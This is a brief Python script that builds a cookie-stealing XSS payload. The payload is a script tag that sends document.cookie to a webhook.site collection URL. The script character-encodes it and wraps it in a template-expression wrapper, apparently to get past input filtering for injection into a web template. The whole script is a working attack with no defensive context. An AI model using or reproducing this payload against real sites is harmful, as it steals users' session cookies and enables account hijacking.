def encode_payload(payload):
    parts = ["'%c'%{}".format(ord(c)) for c in payload]
    return '+'.join(parts)

payload="<script>fetch(`https://webhook.site/9943db93-6104-4c2e-b233-e21de7d7de43?c=`+document.cookie)</script>"
payload="${"+encode_payload(payload)+"}"
print(payload) 